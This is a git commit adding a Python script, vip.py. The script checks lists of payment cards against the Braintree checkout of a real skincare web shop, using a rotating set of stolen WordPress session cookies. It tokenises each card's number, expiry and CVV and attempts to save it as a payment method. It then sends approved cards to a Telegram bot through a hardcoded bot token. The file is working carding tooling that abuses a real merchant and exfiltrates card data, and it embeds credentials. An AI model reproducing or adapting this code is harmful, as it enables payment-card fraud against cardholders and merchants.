5499afc3aad420e7e9a70f888d3fef6322a1ebfc
4gwd <123549713+4gwd@users.noreply.github.com>
2024-05-21 13:48:32 +0300

    Create vip.py

---
+++ vip.py
@@ -0,0 +1,255 @@
+import requests, os
+import pyfiglet
+import json
+import time
+import user_agent
+from urllib.parse import urlparse, parse_qs
+	
+O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
+Z =  '\033[1;37m' #white
+F = '\033[1;32m' #Green
+B = '\033[2;36m' #Light Blue
+X = '\033[1;33m' #Yellow
+C = '\033[2;35m' #Purple
+	
+logo = pyfiglet.figlet_format('TAKEMICHI')
+k=("----☆----☆-----☆------☆-----☆") 
+lo=("By: TAKEMICHI ~ @Q_2_M")
+i=("----☆----☆-----☆------☆-----☆")
+print(Z+logo)
+print(C+k)
+print(Z+lo)
+print(X+i)
+ido = "-1001840965165"
+tokno = "6779842121:AAGGVAb0kvFT6pZYDTA7c_gR9z6RGbBQpIU"
+os.system('clear')
+print(Z+logo)
+print(C+k)
+print(Z+lo)
+print(X+i)
+o=("")
+NMF = "00"
+print(C+i)
+	
+file=open(NMF,"+r")
+start_num = 0
+for P in file.readlines():
+	start_num += 1
+	n = P.split('|')[0]
+	mm=P.split('|')[1]
+	yy=P.split('|')[2][-2:]
+	cvc=P.split('|')[3].replace('\n', '')
+	P=P.replace('\n', '')
+	
+		
+	import requests, re, base64, random, string, user_agent
+	from bs4 import BeautifulSoup
+	
+	
+	
+	
+	user = user_agent.generate_user_agent()
+	
+	
+	with open(NMF, 'r') as file:
+		first_line = file.readline()
+	while True:
+		lines="""
+uyyyfyg%7C1716424940%7CxEhnTfVK4z3kRTKDoQTVsuiKXNry4U33Xfnj3Hl7xAk%7C6a4cf2ef88655e55d1250af0f83b86135c0b6904ccdf7c17b4ab7fdaac3a419c
+cvcvvv%7C1716425363%7Ca8UT6eTAmbmmNJ1weoL2y4n4DWZ6rH1rvc3xbcM8e8F%7C49b2a2cfc1b4019d861cbcd92be67ed588b97cc768d81a8afc180e31395b9536
+mbnbb%7C1716425763%7CxX20bDxQkTnH5LEWqIFdIz6uXrsDPQaBV3dwXsa6hHZ%7C279e0fe94cdad641cb138c44690500d9df305a31f94e8a7566e8ad0e9a724566
+yasirmyksmksa%7C1716425935%7Cs2kHFHUCc2ywTg3KKX37i213fyntWPessNR5qQNYFw6%7C1044d5a09ffc0ca86685c84773a6bb20e2e5399ce0da3409bac5f63c00ef286b
+my2yasir%7C1716426274%7CojctjsOjj1uFlW606lRLSDru6IksEv9fXGk5yLy0WNN%7C5ad538567783a68b18d4503d43c535b087bea9c33ae2da1469768489b89cc667
+myyasirry%7C1716426414%7CZqB2IeWyDqo1SGuMk6chWL4EZKDBl0tb16abSzsvE31%7Ca261447c5bec25905d41d9b13b59c560de5555baeea1e6c51c32dafc151dd3f2
+yasirbrn%7C1716426524%7CAYyLPQ5waYhADpgBMD5uyMErq381u3NBcpb5JlUM087%7Cfde58ad056b5e6e5196f172dde3a9a7c7793f6f54737567042cbf985ab2f95ec
+bbnbvb%7C1716426632%7CqQEIEBE4bi7nR1DLABdy5CJUb2D6dUhIw7FDIW0xAxn%7C497cf860fc6cef39fa0ec01c786c735e961d8890e83113d8b023d6a2f4450266
+uyuyu%7C1716426797%7C2KWRMHRrJuiZ4h5qOjiQdIv7HW9RcikNizDJkHCyuAA%7Ca3fe875b727e1ca00ce7ee35002e481958559128d933fbdd1ea28cbf18a79587
+mybigyasirboos%7C1716426904%7CM2XmNQ7WX6IP6jQRl3awGoVCC3O1NpH3QY1moQsOMF9%7Cee63f0522a54e6b7cf2c57642963b4a455d7af202e98c966bdd4e18bfb2d72d3
+gimyasir%7C1716426999%7Cn7rRSH9FhvemO0y1uob0fIcjThoBdxeZ7ot0lg03zv6%7Ca70845312308e675397436d8827260e465883ac739305bb94354af7aa2c14af9
+bnyasirbot%7C1716429013%7Cg5kVExzYvpDnIGGcxNQ2pNpot0kGcnTcg7VkP96RUQ3%7C5e4fcd0c6a29bd7acd466a1a400b1267c6909546380e3a6141647f994b7aac5b"""
+		lines = lines.strip().split('\n')
+		random_line_number = random.randint(0, len(lines) - 1)
+		cok = lines[random_line_number]
+		if cok == first_line:
+			pass
+		else:
+			break
+	with open('yasir.txt', 'w') as file:
+		file.write(cok)
+	cookies = {
+	    'wssplashuid': '3cb27488267f6f4294c90e8d8ce7e91d292c03fa.1715037173.1',
+	    'sbjs_migrations': '1418474375998%3D1',
+	    'sbjs_current_add': 'fd%3D2024-05-06%2023%3A21%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F',
+	    'sbjs_first_add': 'fd%3D2024-05-06%2023%3A21%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F',
+	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+	    'pixelcat_id': '3162bd1de5',
+	    '_omappvp': 'wrGEytX41377F1u6cTLFHl9xFh16ivE3GNqBs0HS6TDvODHyB1zmqAa2SkSGp4cXZCrHv9Q5uQxQzWswFWvOFZeGEdcOYqT0',
+	    '_gcl_au': '1.1.460234453.1715037717',
+	    '_ga': 'GA1.1.1426328219.1715037717',
+	    '_fbp': 'fb.1.1715037717032.298791665',
+	    '_omappvs': '1715037978618',
+	    'omSeen-brgbxa1tkhfdya4uuekg': '1715037980746',
+	    '_lscache_vary': 'b65bf87edec07f81ededf6aa0d5cf54f',
+	    'wordpress_logged_in_71d75a39a4ff95f3d589fe53a81a64b1': cok,
+	    'wfwaf-authcookie-5051286a9e2b2d2fab68263a1c3de8db': '3620%7Cother%7Cread%7C2a44d76cd76da4706f17317bc4725e2294837b2c2e6992d2f3ae5346eb694cec',
+	    '_ga_M6LZD72P57': 'GS1.1.1715037716.1.1.1715038031.45.0.0',
+	    'sbjs_session': 'pgs%3D17%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2Fmy-account%2Fpayment-methods%2F',
+	}
+	
+	headers = {
+	    'authority': 'www.annarosaskincare.com',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+	    'referer': 'https://www.annarosaskincare.com/my-account/payment-methods/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
+	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	
+	response = requests.get('https://www.annarosaskincare.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
+	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
+	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
+	dec = base64.b64decode(enc).decode('utf-8')
+	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
+	import requests
+	
+	headers = {
+	    'authority': 'payments.braintree-api.com',
+	    'accept': '*/*',
+	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+	    'authorization': f'Bearer {au}',
+	    'braintree-version': '2018-05-10',
+	    'content-type': 'application/json',
+	    'origin': 'https://assets.braintreegateway.com',
+	    'referer': 'https://assets.braintreegateway.com/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'cross-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	
+	json_data = {
+	    'clientSdkMetadata': {
+	        'source': 'client',
+	        'integration': 'custom',
+	        'sessionId': '6778b0be-5124-4574-b38a-9fbeaa061ed8',
+	    },
+	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+	    'variables': {
+	        'input': {
+	            'creditCard': {
+	                'number': n,
+	                'expirationMonth': mm,
+	                'expirationYear': yy,
+	                'cvv': cvc,
+	                'billingAddress': {
+	                    'postalCode': '10080',
+	                    'streetAddress': 'new york 45',
+	                },
+	            },
+	            'options': {
+	                'validate': False,
+	            },
+	        },
+	    },
+	    'operationName': 'TokenizeCreditCard',
+	}
+	
+	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+	tok = response.json()['data']['tokenizeCreditCard']['token']
+	import requests
+	
+	cookies = {
+	    'wssplashuid': '3cb27488267f6f4294c90e8d8ce7e91d292c03fa.1715037173.1',
+	    'sbjs_migrations': '1418474375998%3D1',
+	    'sbjs_current_add': 'fd%3D2024-05-06%2023%3A21%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F',
+	    'sbjs_first_add': 'fd%3D2024-05-06%2023%3A21%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2F',
+	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+	    'pixelcat_id': '3162bd1de5',
+	    '_omappvp': 'wrGEytX41377F1u6cTLFHl9xFh16ivE3GNqBs0HS6TDvODHyB1zmqAa2SkSGp4cXZCrHv9Q5uQxQzWswFWvOFZeGEdcOYqT0',
+	    '_gcl_au': '1.1.460234453.1715037717',
+	    '_ga': 'GA1.1.1426328219.1715037717',
+	    '_fbp': 'fb.1.1715037717032.298791665',
+	    '_omappvs': '1715037978618',
+	    'omSeen-brgbxa1tkhfdya4uuekg': '1715037980746',
+	    '_lscache_vary': 'b65bf87edec07f81ededf6aa0d5cf54f',
+	    'wordpress_logged_in_71d75a39a4ff95f3d589fe53a81a64b1': cok,
+	    'wfwaf-authcookie-5051286a9e2b2d2fab68263a1c3de8db': '3620%7Cother%7Cread%7C2a44d76cd76da4706f17317bc4725e2294837b2c2e6992d2f3ae5346eb694cec',
+	    '_ga_M6LZD72P57': 'GS1.1.1715037716.1.1.1715038031.45.0.0',
+	    'sbjs_session': 'pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.annarosaskincare.com%2Fmy-account%2Fadd-payment-method%2F',
+	}
+	
+	headers = {
+	    'authority': 'www.annarosaskincare.com',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+	    'cache-control': 'max-age=0',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://www.annarosaskincare.com',
+	    'referer': 'https://www.annarosaskincare.com/my-account/add-payment-method/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
+	    'sec-fetch-site': 'same-origin',
+	    'upgrade-insecure-requests': '1',
+	    'user-agent': user,
+	}
+	
+	data = {
+	    'payment_method': 'braintree_cc',
+	    'braintree_cc_nonce_key': tok,
+	    'braintree_cc_device_data': '{"device_session_id":"5f49647bdd93c3e04115f1a3ab40a200","fraud_merchant_id":null,"correlation_id":"f063c955214bae19fb05c0f2ed9afdda"}',
+	    'braintree_cc_3ds_nonce_key': '',
+	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/f8mwyf6zpp2fnqm8/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/f8mwyf6zpp2fnqm8"},"merchantId":"f8mwyf6zpp2fnqm8","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI5ODBlZTM4Ny00YjFhLTRiOTQtYjI2Mi03M2Y0ZTg2NjA5ZTMiLCJpYXQiOjE3MTUwMzgwNzQsImV4cCI6MTcxNTA0NTI3NCwiaXNzIjoiNjA2MjcwNzU4OGVhZmY2MGQ0MGRkOTE4IiwiT3JnVW5pdElkIjoiNjA2MjcwNzVhN2E3NTE2NDU3M2U0ZmRiIn0.ij0iVOqqNfs9QzqnthQDzop3vu1uZEIsBYOkfVnhQc4"},"paypalEnabled":true,"paypal":{"displayName":"Anna Rosa Skincare","clientId":"ATwBtXltSZ2U53P14qpEfnxGV80o1qL8gCqheeFBEPq51Of8c2tqohHkDchF4v9KjoQzPgttvoB03WvZ","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"annarosaskincareUSD","payeeEmail":null,"currencyIsoCode":"USD"}}',
+	    'woocommerce-add-payment-method-nonce': add_nonce,
+	    '_wp_http_referer': '/my-account/add-payment-method/',
+	    'woocommerce_add_payment_method': '1',
+	}
+	
+	response = requests.post(
+	    'https://www.annarosaskincare.com/my-account/add-payment-method/',
+	    cookies=cookies,
+	    headers=headers,
+	    data=data,
+	)
+	
+	text = response.text
+	pattern = r'Reason: (.+?)\s*</li>'
+	match = re.search(pattern, text)
+	if match:
+		result = match.group(1)
+	else:
+		if 'Payment method successfully added.' in text:
+			result = "1000: Approved"
+		elif 'risk_threshold' in text:
+			result = "RISK: Retry this BIN later."
+		elif 'Please wait for 20 seconds.' in text:
+			result = "try again"
+		else:
+			result = 'declined'
+			print('er#')
+	if 'funds' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or '1000: Approved' in result or 'Thank you' in result or 'confirmed' in result or 'Insufficient Funds' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
+		print(F+f'[{start_num}]',P,'➜ '+result+' ✅ ')
+		requests.post(f"https://api.telegram.org/bot{tokno}/sendMessage?chat_id={ido}&parse_mode=HTML&text=𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n━━━━━━━━━━━━━━━━           \n[↯] 𝗖𝗖 ⇾ <code>{P}</code>\n[↯] 𝗚𝗔𝗧𝗘𝗦: Braintree Auth\n[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: {result} 🟢\n━━━━━━━━━━━━━━━━\n[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ <a href='t.me/Q_2_M'>𝗧𝗔𝗞𝗘𝗠𝗜𝗖𝗛𝗜</a>")
+	else:
+		print(O+f'[{start_num}]',P,'➜ '+result+' ❌ ')
+	   
+	time.sleep(20)
+	
+	
+	
